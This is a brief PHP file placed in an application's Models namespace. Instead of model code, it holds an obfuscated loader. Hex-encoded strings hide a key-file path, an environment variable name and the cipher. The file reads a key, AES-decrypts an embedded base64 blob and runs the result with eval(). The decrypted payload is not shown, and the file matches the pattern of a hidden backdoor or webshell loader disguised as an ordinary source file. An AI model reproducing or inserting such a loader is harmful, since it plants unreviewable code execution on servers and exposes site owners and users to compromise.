<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dDi8yrMlmCQI71rrbpycuQ==');

$c=base64_decode(

'z2slfvwUeG9rNDqCDNLc3dqRbqqdIrHtjdkB/bHwLIQ8FnX9fbY73dXtwJ8q8GXV5ybXpol2JUyX' .
'i6i1x9vo1NypL7JQqiqbSBESz7/gxwX1c5Nho0CQv4rs7WynYCpPVyUUIW/7rXi2uhL0V7RNsJr/' .
'MymS62skfiG0ByvZSCf+HHZwBdlpO9oNW/mFfDPUKgSF1tBwfFuWL4YcamqprfrBM/MvZ+Ig/Y6o' .
'7sN3MYdzzIRUo4y90i0wuR465vuc9uDQy1mQodSBMiv6FCw8p5XjT+n0yJHq4XC6WGGL5GOGV2q4' .
'xEZo/AoXbfzZAQMKVEkZO2OECPlc+BFesNcUYVzCyqyiWs6qTjRWkQAMHL8uHjntTrJ3WSHuJh96' .
'9H7YAbF6b1q5I0EYFGDKpLdkigAi05adV2JI2YyIzKRQ+nvRYSNOvcgImR9vCM/jtXBU8eLFejaG' .
'5jERH3u2Vk+hHW/txxDIVyriqbbF17Qbr2bQnJaY7+g3L/Ak5UKGjDt7IwCfyarbJ6c8G0E6HltA' .
'RThyolBPZApWlYvBhec1jWQ+UlQvTzcMqLHDQRnyX2XjdBLXEpD27oqjhS6GQl2I6uvGn2LwPvM/' .
'vSPFvy3H8DDW30TclKKkPUppkCsD1tza+CWkhkxLygRuLwmjFEwMMW+Z6jQZB+O2SYYRnDf967MT' .
'NTvohV8HnEEoUU7NpY2PYIRkpo7wnfqfngjSqjFDlDxVXxIpReouQouAlWZvvHD2LCHUMc+2pmJ4' .
'ERN9m5lARVKpHqQRuvcSI9VDW9Jg7Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

